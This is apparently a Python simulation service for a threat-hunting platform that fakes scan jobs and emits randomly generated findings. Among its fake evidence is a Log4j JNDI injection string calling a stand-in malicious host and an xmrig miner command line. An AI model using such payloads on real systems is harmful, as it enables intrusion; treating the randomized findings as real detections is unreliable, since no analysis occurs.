import asyncio
import random
import logging
from typing import Dict, List, Any
from datetime import datetime, timedelta

from app.models.job import Job, JobStatus, TaskType

logger = logging.getLogger(__name__)

class SimulationService:
    """Service to simulate threat hunting operations on edge nodes"""
    
    def __init__(self, node_info: Dict[str, Any]):
        self.node_info = node_info
        
    async def execute_task(self, job: Job) -> None:
        """Execute a simulated task"""
        try:
            job.start()
            logger.info(f"Starting job {job.job_id} of type {job.task_type}")
            
            # Simulate task processing based on type
            if job.task_type in ["threat_hunt_ioc", "threat_hunt_ttp"]:
                await self._simulate_threat_hunt(job)
            elif job.task_type == "registry_analysis":
                await self._simulate_registry_analysis(job)
            elif job.task_type == "file_system_scan":
                await self._simulate_file_scan(job)
            elif job.task_type == "network_monitoring":
                await self._simulate_network_monitoring(job)
            elif job.task_type == "log_analysis":
                await self._simulate_log_analysis(job)
            elif job.task_type == "process_inspection":
                await self._simulate_process_inspection(job)
            elif job.task_type == "memory_analysis":
                await self._simulate_memory_analysis(job)
            else:
                await self._simulate_generic_task(job)
                
        except Exception as e:
            logger.error(f"Error executing job {job.job_id}: {str(e)}")
            job.fail(str(e))
    
    async def _simulate_threat_hunt(self, job: Job):
        """Simulate threat hunting for IoCs and TTPs"""
        indicator = job.parameters.get("indicator", "Unknown Indicator")
        search_description = job.parameters.get("search_description", "")
        priority = job.parameters.get("priority", "medium")
        
        # Simulate progressive scanning
        stages = [
            "Initializing hunt parameters",
            "Scanning system logs", 
            "Analyzing network connections",
            "Checking file system artifacts",
            "Cross-referencing indicators",
            "Generating final report"
        ]
        
        evidence = []
        findings_count = 0
        
        for i, stage in enumerate(stages):
            await asyncio.sleep(random.uniform(1, 3))  # Simulate work
            progress = int((i + 1) * 100 / len(stages))
            job.progress = progress
            logger.info(f"Job {job.job_id} progress: {progress}% - {stage}")
            
            # Randomly generate findings (more likely for high priority)
            if priority == "high" and random.random() < 0.4:
                finding = self._generate_threat_finding(indicator, stage)
                evidence.append(finding)
                findings_count += 1
            elif priority == "medium" and random.random() < 0.2:
                finding = self._generate_threat_finding(indicator, stage)
                evidence.append(finding)
                findings_count += 1
            elif priority == "low" and random.random() < 0.1:
                finding = self._generate_threat_finding(indicator, stage)
                evidence.append(finding)
                findings_count += 1
        
        # Generate final result
        result = {
            "indicator_searched": indicator,
            "search_description": search_description,
            "priority": priority,
            "node_id": self.node_info["node_id"],
            "hostname": self.node_info["hostname"],
            "scan_completed": True,
            "findings_count": findings_count,
            "threat_detected": findings_count > 0,
            "scan_duration_seconds": random.randint(30, 180),
            "confidence_score": random.uniform(0.7, 0.95) if findings_count > 0 else random.uniform(0.1, 0.3),
            "recommendations": self._generate_recommendations(findings_count > 0)
        }
        
        job.complete(result, evidence)
    
    async def _simulate_registry_analysis(self, job: Job):
        """Simulate Windows registry analysis"""
        if self.node_info["os_type"] != "windows":
            job.fail("Registry analysis not supported on non-Windows systems")
            return
        
        stages = ["Accessing registry", "Scanning for suspicious entries", "Analyzing persistence mechanisms"]
        
        for i, stage in enumerate(stages):
            await asyncio.sleep(random.uniform(0.5, 1.5))
            job.progress = int((i + 1) * 100 / len(stages))
        
        evidence = []
        if random.random() < 0.3:  # 30% chance of finding something
            evidence.append({
                "type": "registry_key",
                "location": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "value": "SuspiciousApp.exe",
                "severity": "medium",
                "timestamp": datetime.utcnow().isoformat()
            })
        
        result = {
            "analysis_type": "registry_analysis",
            "keys_scanned": random.randint(1000, 5000),
            "suspicious_entries": len(evidence),
            "node_info": self.node_info
        }
        
        job.complete(result, evidence)
    
    async def _simulate_file_scan(self, job: Job):
        """Simulate file system scanning"""
        stages = ["Initializing scan", "Scanning system directories", "Analyzing file hashes", "Checking timestamps"]
        
        for i, stage in enumerate(stages):
            await asyncio.sleep(random.uniform(1, 2))
            job.progress = int((i + 1) * 100 / len(stages))
        
        evidence = []
        files_scanned = random.randint(10000, 50000)
        
        # Generate some suspicious files occasionally
        if random.random() < 0.25:
            evidence.append({
                "type": "suspicious_file",
                "path": "/tmp/suspicious_script.sh" if self.node_info["os_type"] == "linux" else "C:\\Temp\\malware.exe",
                "hash": "7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730",
                "size": random.randint(1024, 1024*1024),
                "created": (datetime.utcnow() - timedelta(hours=random.randint(1, 48))).isoformat(),
                "severity": "high"
            })
        
        result = {
            "analysis_type": "file_system_scan",
            "files_scanned": files_scanned,
            "suspicious_files": len(evidence),
            "scan_time_seconds": random.randint(60, 300)
        }
        
        job.complete(result, evidence)
    
    async def _simulate_network_monitoring(self, job: Job):
        """Simulate network connection monitoring"""
        stages = ["Starting network capture", "Analyzing connections", "Checking against threat feeds"]
        
        for i, stage in enumerate(stages):
            await asyncio.sleep(random.uniform(0.8, 2))
            job.progress = int((i + 1) * 100 / len(stages))
        
        evidence = []
        connections_analyzed = random.randint(100, 1000)
        
        # Occasionally find suspicious connections
        if random.random() < 0.2:
            evidence.append({
                "type": "suspicious_connection",
                "destination_ip": "185.246.87.50",  # From the sample IoC list
                "destination_port": random.choice([80, 443, 8080, 4433]),
                "protocol": "TCP",
                "timestamp": datetime.utcnow().isoformat(),
                "severity": "high",
                "threat_intel_match": True
            })
        
        result = {
            "analysis_type": "network_monitoring",
            "connections_analyzed": connections_analyzed,
            "suspicious_connections": len(evidence),
            "monitoring_duration": random.randint(30, 120)
        }
        
        job.complete(result, evidence)
    
    async def _simulate_log_analysis(self, job: Job):
        """Simulate log file analysis"""
        stages = ["Loading log files", "Parsing entries", "Pattern matching", "Correlation analysis"]
        
        for i, stage in enumerate(stages):
            await asyncio.sleep(random.uniform(1, 2.5))
            job.progress = int((i + 1) * 100 / len(stages))
        
        evidence = []
        log_entries = random.randint(5000, 25000)
        
        # Occasionally find suspicious log entries
        if random.random() < 0.3:
            evidence.append({
                "type": "suspicious_log_entry",
                "log_file": "/var/log/auth.log" if self.node_info["os_type"] == "linux" else "Security.evtx",
                "entry": "${jndi:ldap://malicious.com/exploit}",
                "timestamp": datetime.utcnow().isoformat(),
                "severity": "critical",
                "pattern_match": "Log4j exploitation attempt"
            })
        
        result = {
            "analysis_type": "log_analysis",
            "log_entries_analyzed": log_entries,
            "suspicious_entries": len(evidence),
            "analysis_time": random.randint(45, 180)
        }
        
        job.complete(result, evidence)
    
    async def _simulate_process_inspection(self, job: Job):
        """Simulate running process inspection"""
        stages = ["Enumerating processes", "Analyzing process trees", "Checking signatures"]
        
        for i, stage in enumerate(stages):
            await asyncio.sleep(random.uniform(0.5, 1.5))
            job.progress = int((i + 1) * 100 / len(stages))
        
        evidence = []
        processes_checked = random.randint(50, 200)
        
        # Occasionally find suspicious processes
        if random.random() < 0.15:
            evidence.append({
                "type": "suspicious_process",
                "process_name": "xmrig64.exe" if self.node_info["os_type"] == "windows" else "xmrig",
                "pid": random.randint(1000, 9999),
                "command_line": "--donate-level 0 --pool pool.minexmr.com:4444",
                "parent_process": "explorer.exe" if self.node_info["os_type"] == "windows" else "bash",
                "severity": "high",
                "threat_type": "cryptocurrency_miner"
            })
        
        result = {
            "analysis_type": "process_inspection",
            "processes_analyzed": processes_checked,
            "suspicious_processes": len(evidence),
            "inspection_time": random.randint(15, 60)
        }
        
        job.complete(result, evidence)
    
    async def _simulate_memory_analysis(self, job: Job):
        """Simulate memory analysis"""
        stages = ["Creating memory dump", "Analyzing heap", "Scanning for injected code"]
        
        for i, stage in enumerate(stages):
            await asyncio.sleep(random.uniform(2, 4))  # Memory analysis takes longer
            job.progress = int((i + 1) * 100 / len(stages))
        
        evidence = []
        
        # Memory analysis finds fewer but more critical things
        if random.random() < 0.1:
            evidence.append({
                "type": "memory_artifact",
                "artifact_type": "injected_dll",
                "process_name": "svchost.exe",
                "memory_address": "0x7ff8a2c10000",
                "size": 65536,
                "severity": "critical",
                "description": "Unsigned DLL injected into system process"
            })
        
        result = {
            "analysis_type": "memory_analysis",
            "memory_regions_analyzed": random.randint(100, 500),
            "artifacts_found": len(evidence),
            "analysis_duration": random.randint(120, 300)
        }
        
        job.complete(result, evidence)
    
    async def _simulate_generic_task(self, job: Job):
        """Generic task simulation"""
        duration = random.uniform(2, 8)
        steps = 5
        
        for i in range(steps):
            await asyncio.sleep(duration / steps)
            job.progress = int((i + 1) * 100 / steps)
        
        result = {
            "task_type": job.task_type,
            "status": "completed",
            "node_info": self.node_info,
            "execution_time": duration
        }
        
        job.complete(result)
    
    def _generate_threat_finding(self, indicator: str, context: str) -> Dict[str, Any]:
        """Generate a realistic threat finding"""
        finding_types = [
            "network_connection",
            "file_artifact", 
            "registry_entry",
            "log_entry",
            "process_activity"
        ]
        
        return {
            "type": random.choice(finding_types),
            "indicator": indicator,
            "context": context,
            "severity": random.choice(["low", "medium", "high", "critical"]),
            "confidence": random.uniform(0.6, 0.95),
            "timestamp": datetime.utcnow().isoformat(),
            "node_id": self.node_info["node_id"],
            "details": f"Evidence of {indicator} found during {context.lower()}"
        }
    
    def _generate_recommendations(self, threat_found: bool) -> List[str]:
        """Generate security recommendations"""
        if threat_found:
            return [
                "Isolate affected system from network",
                "Collect forensic artifacts", 
                "Escalate to incident response team",
                "Monitor for lateral movement",
                "Update threat intelligence feeds"
            ]
        else:
            return [
                "Continue monitoring for indicators",
                "Update detection signatures",
                "Review security policies",
                "Schedule regular scans"
            ]